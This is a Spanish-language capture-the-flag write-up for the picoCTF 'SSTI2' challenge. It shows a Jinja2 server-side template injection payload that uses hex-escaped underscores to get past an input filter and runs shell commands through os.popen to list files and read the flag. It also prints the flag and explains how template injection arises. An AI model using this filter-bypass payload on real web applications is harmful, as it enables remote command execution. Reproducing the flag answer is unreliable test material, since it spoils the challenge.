### SSTI2
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:60469/)!
### Solución 
Realizamos inyeccion Jinja2

```
{{ config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')() }}
```
Asi obtenemos los archivos.
```
__pycache__

app.py

flag

requirements.txt
```
Ahora solo hacemos cat a la bandera.
```
{{ config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}
```

picoCTF{sst1_f1lt3r_byp4ss_4de30aa0}
### Notas
los desarrolladores web usan "motores de plantillas" (como Jinja2 en Python/Flask, Twig en PHP, o Pug en Node.js) para crear páginas HTML dinámicas. En lugar de escribir el mismo código HTML cien veces, hacen una plantilla y le inyectan variables.

El problema ocurre cuando el servidor confía ciegamente en lo que el usuario escribe y lo evalúa como si fuera código del motor de plantillas, en lugar de tratarlo como simple texto.